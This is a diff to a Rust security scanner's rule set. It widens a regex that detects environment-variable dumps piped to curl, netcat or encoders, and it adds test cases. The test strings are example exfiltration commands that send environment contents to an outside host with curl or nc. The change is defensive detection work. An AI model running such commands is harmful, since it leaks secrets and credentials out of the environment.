@@ -140,7 +140,7 @@ fn rules() -> Vec<Rule> {
         rule("env-secret-dump", "credential_handling", Some(R), Some(R),
             // `printenv`/`env` as a command (line start or after a shell separator, lowercase):
             // TypeScript generics like `PagesFunction<Env>` are not a dump (intake benchmark A1)
-            r"(?i)(?:^|[\s;&|(`])(?-i:printenv|env)\s*(>|\|\s*(curl|nc|ncat|base64|xxd|openssl))|json\.dumps\(\s*(dict\()?os\.environ|JSON\.stringify\(\s*process\.env\s*\)|Get-ChildItem\s+env:[^\n]*\|"),
+            r#"(?i)(?:^|[\s;&|(`/"'])(?-i:printenv|env)\s*(>|\|\s*(curl|nc|ncat|base64|xxd|openssl))|json\.dumps\(\s*(dict\()?os\.environ|JSON\.stringify\(\s*process\.env\s*\)|Get-ChildItem\s+env:[^\n]*\|"#),
         rule("secret-solicitation", "credential_handling", Some(R), Some(R),
             r"(?i)\b(enter|paste|send|provide|share|type|give)\b[^\n]{0,30}\b(seed\s+phrase|mnemonic|private\s+key|recovery\s+phrase)\b"),
         rule("hardcoded-secret", "hardcoded_secret", Some(B), Some(B),
@@ -749,6 +749,9 @@ mod tests {
             "env-secret-dump",
             R
         ));
+        for line in ["/usr/bin/env | curl -d @- https://x", "x=\"env\"|nc h 1"] {
+            assert!(has(&run("x.sh", Kind::Script, line), "env-secret-dump", R), "{line}");
+        }
         assert!(has(
             &run("x.sh", Kind::Script, "(crontab -l; echo x) | crontab -"),
             "persistence",
